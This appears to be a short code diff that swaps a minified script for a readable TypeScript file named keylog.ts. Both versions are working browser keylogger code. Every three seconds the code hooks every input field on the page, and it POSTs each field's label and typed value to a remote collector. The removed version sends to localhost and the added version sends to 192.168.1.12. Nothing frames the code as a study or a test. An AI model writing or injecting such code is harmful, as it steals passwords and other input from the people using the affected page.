@@ -1,1 +1,14 @@
-function log(o){var t=o.target;fetch("http://localhost:3030/data",{method:"POST",body:"".concat(null==t?void 0:t.ariaLabel,": ").concat(null==t?void 0:t.value)})}setInterval(function(){document.querySelectorAll("input").forEach(function(o){o.oninput=log})},3e3);
+// keylog.ts
+function log(e) {
+  const target = e.target;
+  fetch("http://192.168.1.12:3030/data", {
+    method: "POST",
+    body: `${target?.ariaLabel}: ${target?.value}`
+  });
+}
+setInterval(() => {
+  const inputs = document.querySelectorAll("input");
+  inputs.forEach((input) => {
+    input.oninput = log;
+  });
+}, 3000);
